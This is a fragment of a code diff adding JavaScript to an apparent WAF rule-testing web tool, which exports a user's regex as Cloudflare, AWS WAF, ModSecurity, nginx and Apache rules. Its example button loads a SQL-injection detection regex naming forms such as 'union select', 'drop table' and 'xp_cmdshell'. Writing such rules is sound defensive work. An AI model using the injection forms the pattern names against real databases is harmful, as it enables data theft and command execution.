+      var label = f.match ? 'FALSE POSITIVE — would be blocked' : 'OK — not matched';
+      rows += '<div class="waf-payload-row">' + icon +
+        '<div class="waf-payload-body"><span class="waf-payload-str">' + escHtml(f.str) + '</span>' +
+        '<div class="waf-payload-desc">' + escHtml(f.desc) + ' — <em>' + label + '</em></div></div></div>';
+    });
+    fpList.innerHTML = rows;
+  }
+
+  /* ── Export generators ───────────────────────────────────── */
+  function generateExport(format) {
+    var pattern = regexEl.value.trim();
+    var name = ruleNameEl.value.trim() || 'custom-waf-rule';
+    var action = actionEl.value;
+
+    switch(format) {
+      case 'cloudflare': return generateCloudflare(pattern, name, action);
+      case 'aws': return generateAWS(pattern, name, action);
+      case 'modsecurity': return generateModSecurity(pattern, name, action);
+      case 'nginx': return generateNginx(pattern, name, action);
+      case 'apache': return generateApache(pattern, name, action);
+      default: return '# Unknown format';
+    }
+  }
+
+  function generateCloudflare(pattern, name, action) {
+    var cfAction = action === 'block' ? 'block' : action === 'log' ? 'log' : 'managed_challenge';
+    // Cloudflare uses wirefilter — regex is supported via matches operator
+    var lines = [
+      '# Cloudflare WAF Custom Rule',
+      '# Rule: ' + name,
+      '# Action: ' + cfAction,
+      '# Deploy: Dashboard > Security > WAF > Custom Rules > Create Rule',
+      '#',
+      '# Expression (wirefilter syntax):',
+      '(http.request.uri matches "' + escExport(pattern) + '")',
+      'or',
+      '(http.request.body matches "' + escExport(pattern) + '")',
+      'or',
+      '(http.request.uri.query matches "' + escExport(pattern) + '")',
+      '',
+      '# Action: ' + cfAction,
+      '',
+      '# Alternative: single-field match',
+      '# (http.request.uri.query matches "' + escExport(pattern) + '")',
+      '',
+      '# Note: Cloudflare uses RE2 syntax (no backreferences, no lookahead).',
+      '# Test your pattern in the dashboard expression builder before deploying.'
+    ];
+    return lines.join('\n');
+  }
+
+  function generateAWS(pattern, name, action) {
+    var awsAction = action === 'block' ? 'BLOCK' : action === 'log' ? 'COUNT' : 'CAPTCHA';
+    var ruleObj = {
+      "Name": name,
+      "Priority": 1,
+      "Action": {},
+      "Statement": {
+        "OrStatement": {
+          "Statements": [
+            {
+              "RegexMatchStatement": {
+                "RegexString": pattern,
+                "FieldToMatch": { "UriPath": {} },
+                "TextTransformations": [
+                  { "Priority": 0, "Type": "URL_DECODE" },
+                  { "Priority": 1, "Type": "LOWERCASE" }
+                ]
+              }
+            },
+            {
+              "RegexMatchStatement": {
+                "RegexString": pattern,
+                "FieldToMatch": { "QueryString": {} },
+                "TextTransformations": [
+                  { "Priority": 0, "Type": "URL_DECODE" },
+                  { "Priority": 1, "Type": "LOWERCASE" }
+                ]
+              }
+            },
+            {
+              "RegexMatchStatement": {
+                "RegexString": pattern,
+                "FieldToMatch": { "Body": { "OversizeHandling": "MATCH" } },
+                "TextTransformations": [
+                  { "Priority": 0, "Type": "URL_DECODE" },
+                  { "Priority": 1, "Type": "LOWERCASE" }
+                ]
+              }
+            }
+          ]
+        }
+      },
+      "VisibilityConfig": {
+        "SampledRequestsEnabled": true,
+        "CloudWatchMetricsEnabled": true,
+        "MetricName": name.replace(/[^a-zA-Z0-9]/g, '')
+      }
+    };
+    ruleObj.Action[awsAction] = {};
+    return '// AWS WAF v2 Rule Statement\n' +
+      '// Deploy via: AWS Console > WAF > Web ACLs > Rules > Add Rule\n' +
+      '// Or use aws wafv2 update-web-acl CLI command\n' +
+      '// Note: AWS WAF uses a subset of PCRE. Max pattern length: 200 chars.\n\n' +
+      JSON.stringify(ruleObj, null, 2);
+  }
+
+  function generateModSecurity(pattern, name, action) {
+    var msAction = action === 'block' ? 'deny,status:403' : action === 'log' ? 'log,noauditlog,pass' : 'deny,status:403';
+    var lines = [
+      '# ModSecurity Rule',
+      '# Rule: ' + name,
+      '# Deploy: Add to modsecurity.conf or a custom rules file',
+      '# Docs: https://github.com/owasp-modsecurity/ModSecurity/wiki/Reference-Manual',
+      '',
+      '# Inspect URI, query string, and request body',
+      'SecRule REQUEST_URI|ARGS|REQUEST_BODY "' + escExport(pattern) + '" \\',
+      '    "id:100001,\\',
+      '     phase:2,\\',
+      '     t:none,\\',
+      '     t:urlDecodeUni,\\',
+      '     t:lowercase,\\',
+      '     ' + msAction + ',\\',
+      '     msg:\'' + name + ': Suspicious pattern detected\',\\',
+      '     logdata:\'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}\',\\',
+      '     tag:\'application-multi\',\\',
+      '     tag:\'language-multi\',\\',
+      '     tag:\'platform-multi\',\\',
+      '     tag:\'attack-generic\',\\',
+      '     severity:\'CRITICAL\'"',
+      '',
+      '# Note: Adjust the rule ID (100001) to avoid conflicts.',
+      '# Use t:urlDecodeUni and t:lowercase for normalization.',
+      '# Set phase:1 for header-only inspection, phase:2 to include body.'
+    ];
+    return lines.join('\n');
+  }
+
+  function generateNginx(pattern, name, action) {
+    var actionDirective = action === 'block' ? 'return 403;' : action === 'log' ? 'access_log /var/log/nginx/waf_' + name.replace(/[^a-z0-9_-]/gi,'_') + '.log;' : 'return 403;';
+    var lines = [
+      '# nginx WAF Rule',
+      '# Rule: ' + name,
+      '# Deploy: Add inside a server{} or location{} block',
+      '',
+      '# Method 1: Match against request URI',
+      'if ($request_uri ~* "' + escExport(pattern) + '") {',
+      '    ' + actionDirective,
+      '}',
+      '',
+      '# Method 2: Match against query string',
+      'if ($query_string ~* "' + escExport(pattern) + '") {',
+      '    ' + actionDirective,
+      '}',
+      '',
+      '# Method 3: Match against request body (requires ngx_http_lua_module)',
+      '# access_by_lua_block {',
+      '#     ngx.req.read_body()',
+      '#     local body = ngx.req.get_body_data()',
+      '#     if body and ngx.re.match(body, [[' + pattern + ']], "joi") then',
+      '#         ngx.exit(403)',
+      '#     end',
+      '# }',
+      '',
+      '# Note: nginx uses PCRE regex syntax.',
+      '# "if" in location context has limitations — see nginx pitfalls.',
+      '# For production, consider OpenResty/lua-resty-waf or ModSecurity + nginx.'
+    ];
+    return lines.join('\n');
+  }
+
+  function generateApache(pattern, name, action) {
+    var flag = action === 'block' ? '[F,L]' : action === 'log' ? '[L,E=waf_match:1]' : '[F,L]';
+    var lines = [
+      '# Apache .htaccess WAF Rule',
+      '# Rule: ' + name,
+      '# Deploy: Add to .htaccess or httpd.conf VirtualHost',
+      '',
+      'RewriteEngine On',
+      '',
+      '# Block matching request URIs',
+      'RewriteCond %{REQUEST_URI} "' + escExport(pattern) + '" [NC,OR]',
+      'RewriteCond %{QUERY_STRING} "' + escExport(pattern) + '" [NC]',
+      'RewriteRule .* - ' + flag,
+      '',
+      '# Optional: Log matched requests (if action is log)',
+      '# SetEnvIfNoCase Request_URI "' + escExport(pattern) + '" waf_blocked',
+      '# CustomLog /var/log/apache2/waf_' + name.replace(/[^a-z0-9_-]/gi,'_') + '.log combined env=waf_blocked',
+      '',
+      '# Note: Apache uses PCRE regex in RewriteCond.',
+      '# [NC] = case-insensitive, [F] = forbidden (403), [L] = last rule.',
+      '# For request body inspection, use mod_security instead of mod_rewrite.'
+    ];
+    return lines.join('\n');
+  }
+
+  /* ── Render: export ──────────────────────────────────────── */
+  function renderExport() {
+    var format = exportFmt.value;
+    var labels = { cloudflare:'Cloudflare WAF', aws:'AWS WAF', modsecurity:'ModSecurity', nginx:'nginx', apache:'Apache' };
+    exportLabel.textContent = labels[format] || format;
+    exportCode.textContent = generateExport(format);
+  }
+
+  /* ── Tabs ────────────────────────────────────────────────── */
+  tabsEl.addEventListener('click', function(e) {
+    var tab = e.target.getAttribute('data-tab');
+    if (!tab) return;
+    var buttons = tabsEl.querySelectorAll('.waf-tab');
+    for (var i = 0; i < buttons.length; i++) buttons[i].className = 'waf-tab';
+    e.target.className = 'waf-tab waf-tab--active';
+
+    document.getElementById('waf-panel-payloads').style.display = tab === 'payloads' ? '' : 'none';
+    document.getElementById('waf-panel-falsepos').style.display = tab === 'falsepos' ? '' : 'none';
+    document.getElementById('waf-panel-export').style.display = tab === 'export' ? '' : 'none';
+  });
+
+  /* ── Category filters ────────────────────────────────────── */
+  catFilters.addEventListener('click', function(e) {
+    var cat = e.target.getAttribute('data-cat');
+    if (!cat) return;
+    activeFilter = cat;
+    renderPayloads();
+  });
+
+  /* ── Export format change ────────────────────────────────── */
+  exportFmt.addEventListener('change', function() { if (lastResults) renderExport(); });
+
+  /* ── Copy button ─────────────────────────────────────────── */
+  copyBtn.addEventListener('click', function() {
+    var text = exportCode.textContent;
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(text).then(function() {
+        copyBtn.textContent = 'Copied!';
+        setTimeout(function() { copyBtn.textContent = 'Copy'; }, 1500);
+      });
+    } else {
+      var ta = document.createElement('textarea');
+      ta.value = text;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      copyBtn.textContent = 'Copied!';
+      setTimeout(function() { copyBtn.textContent = 'Copy'; }, 1500);
+    }
+  });
+
+  /* ── Test button ─────────────────────────────────────────── */
+  testBtn.addEventListener('click', runTest);
+
+  /* ── Example button ──────────────────────────────────────── */
+  exampleBtn.addEventListener('click', function() {
+    ruleNameEl.value = 'block-sqli-basic';
+    regexEl.value = "(?i)(?:union\\s+(?:all\\s+)?select|select\\s+.+\\s+from\\s+|insert\\s+into\\s+|delete\\s+from\\s+|drop\\s+(?:table|database)|exec(?:ute)?\\s*\\(|xp_cmdshell|information_schema|'\\s*(?:or|and)\\s+['\"]?\\d)";
+    actionEl.value = 'block';
+    metaEl.textContent = 'Valid pattern — flags: g, i (case-insensitive)';
+    metaEl.className = 'waf-regex-meta';
+    runTest();
+  });
+
+  /* ── Clear button ────────────────────────────────────────── */
+  clearBtn.addEventListener('click', function() {
+    regexEl.value = '';
+    ruleNameEl.value = 'custom-waf-rule';
+    actionEl.value = 'block';
+    metaEl.textContent = '';
+    metaEl.className = 'waf-regex-meta';
+    scoreEl.style.display = 'none';
+    resultsEl.style.display = 'none';
+    emptyEl.style.display = '';
+    lastResults = null;
+    activeFilter = 'all';
+  });
+
+  /* ── Utils ───────────────────────────────────────────────── */
+  function escHtml(s) {
+    var d = document.createElement('div');
+    d.appendChild(document.createTextNode(s));
+    return d.innerHTML;
+  }
+
+  function escExport(s) {
+    return s.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+  }
+})();
+</script>
